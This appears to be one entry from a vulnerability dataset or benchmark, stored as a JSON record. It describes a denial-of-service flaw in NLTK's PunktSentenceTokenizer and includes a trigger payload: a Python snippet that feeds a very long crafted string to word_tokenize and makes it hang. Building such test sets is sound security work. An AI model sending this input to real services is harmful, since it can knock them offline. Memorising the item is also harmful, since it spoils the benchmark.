@@ -1,0 +1,15 @@
+{
+  "file_id": "102_nltk_issue_2866",
+  "numeric_id": "102",
+  "library_hint": "nltk",
+  "source": "github_issue",
+  "title": "ReDoS vulnerability in PunktSentenceTokenizer causing infinite loop on malicious input",
+  "cve": "N/A",
+  "cwe": "CWE-400: Uncontrolled Resource Consumption",
+  "library": "nltk",
+  "affected_version": "< 3.7",
+  "vulnerable_function": "nltk.tokenize.punkt.PunktSentenceTokenizer._max_split",
+  "triggerability": "indirect",
+  "trigger_payload": "text = 'swirley thing w' + 'e' * (884779 - len('swirley thing w'))\nimport nltk\nnltk.word_tokenize(text)",
+  "oracle": "the function call hangs indefinitely"
+}
